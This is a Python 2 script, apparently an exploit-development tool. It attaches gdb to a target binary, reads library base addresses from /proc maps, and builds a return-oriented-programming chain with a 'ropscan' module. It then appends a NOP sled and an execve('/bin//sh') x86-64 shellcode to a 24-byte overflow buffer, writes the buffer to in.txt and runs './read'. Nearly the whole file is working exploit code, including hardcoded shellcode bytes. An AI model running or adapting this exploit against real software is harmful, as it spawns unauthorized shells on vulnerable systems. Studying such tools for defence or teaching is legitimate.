#to do :
#   parse the command line, so that shell code adress can be passed to dummy method.
import collections
from threading import Thread
from Queue import Queue
import time
import os
import subprocess
import sys
import ropscan
import getopt
import struct

binary_path = ''
shell_code_file = ''
shell_code_address = ''
#sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def thread1(threadname, binary_path):
    #global binary_path
    gdb_command = '/usr/bin/gdb ' + binary_path
    os.system( gdb_command)


def thread2(threadname, binary_path, shell_code_address, shell_code_file):
    #global binary_path, shell_code_address, shell_code_size, shell_code_file
    print binary_path
    lib_address_dict = collections.OrderedDict()
    process_found = False
    proc_text_split = []
    gdb_command = '/usr/bin/gdb ' + binary_path
    grep_cmd = 'ps -eaf | grep \'' + gdb_command + '\''
    gdb_proc_id = ''
    print grep_cmd
    while process_found == False:
        proc = subprocess.Popen(grep_cmd, stdout=subprocess.PIPE, shell=True)
        proc_text = proc.stdout.read()
        proc_text_split = proc_text.split('\n')
        if len(proc_text_split) > 1:
            for proc_text_line in proc_text_split:
                if len(proc_text_line) > 0:
                    proc_text_line_split = proc_text_line.split()
                    proc_split_len = len(proc_text_line_split)
                    proc_cmd = proc_text_line_split[proc_split_len - 2] + ' ' + proc_text_line_split[proc_split_len - 1]
                    if proc_cmd == gdb_command:
                        process_found = True
                        gdb_proc_id = proc_text_line_split[1]
                        #os.system('kill -9 ' + gdb_proc_id)
                        break

        if process_found == True:
            proc_mapping_file_path = '/proc/' + gdb_proc_id + '/maps'
            print proc_mapping_file_path
            if os.path.exists(proc_mapping_file_path) and os.path.isfile(proc_mapping_file_path):
                f = open(proc_mapping_file_path, 'r')
                lines = f.readlines()
                for line in lines:
                    line = line.rstrip()
                    l_split = line.split()
                    if len(l_split) > 5:
                        addr = l_split[0]
                        lib = l_split[len(l_split) - 1]
                        if('/lib/' in lib):
                            if lib not in lib_address_dict.keys():
                                lib_address_dict[lib] = addr.split('-')[0]
        os.system('kill -9 ' + gdb_proc_id)
    print '2'
    processAllLibraries(lib_address_dict)

def processAllLibraries(lib_address_dict):
    global binary_path, shell_code_address, shell_code_file
    shell_code = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    gadgets_found = False
    logfile = open('gadgets.log','w')
    print lib_address_dict.keys()
    for key in lib_address_dict.keys():
        print 'Processing library ' + key
        buf = 24 * 'A'
        gadgetList = ropscan.GadgetList(int(shell_code_address, 16), logfile)
        gadgetScanner = ropscan.GadgetScanner(gadgetList)
        gadgetScanner.instructionScan(key, int(lib_address_dict[key], 16))
        addrs = gadgetList.createROPChain()
        if addrs is not None:
            for addr in addrs:
                buf += struct.pack("<Q", addr)
            buf += "\x90" * 20
            buf += shell_code
            gadgets_found = True
            break
    if gadgets_found == True:
        buff_file = open('in.txt', 'wb')
        buff_file.write(buf)
        buff_file.close()
        subprocess.call(['./read'])

    else:
        print 'Could not create a ROP Chain'
                

    
def printHelpMessage():
    print 'help'
    exit(0)
def parseCommandLine():
    global binary_path, shell_code_address, shell_code_size, shell_code_file
    print sys.argv
    if(len(sys.argv) < 4):
        printHelpMessage()
        exit(0)
    else:
        try:
            opts, args = getopt.getopt(sys.argv[1:], 'f:a:b:')
        except getopt.GetoptError:
            help_message()
        for opt, arg in opts:
            print opt, arg
            if opt == '-b':
                binary_path = arg
            elif opt == '-f':
                shell_code_file = arg
            elif opt == '-a':
                shell_code_address = arg

parseCommandLine()
print binary_path
#time.sleep(2)
thread1 = Thread(target=thread1, args=("Thread-1", binary_path))
thread2 = Thread(target=thread2, args=("Thread-2", binary_path, shell_code_address, shell_code_file))

thread1.start()
thread2.start()
thread1.join()
thread2.join()
